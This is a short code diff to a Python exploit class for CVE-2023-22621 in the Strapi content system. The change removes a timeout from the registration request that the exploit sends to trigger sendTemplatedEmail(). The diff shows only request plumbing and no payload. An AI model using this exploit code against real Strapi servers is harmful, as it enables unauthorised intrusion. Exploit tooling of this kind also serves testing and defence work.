@@ -84,8 +84,7 @@ class CVE_2023_22621(StrapiExploitInterface):
             "password": self.get_random_password(),
         }
         r = requests.post(f"{self.url}/api/auth/local/register",
-            json=json_data,
-            timeout=10
+            json=json_data
         )
         self.info("sendTemplatedEmail() should be triggered")
         self.info(f"Response code: {r.status_code}")
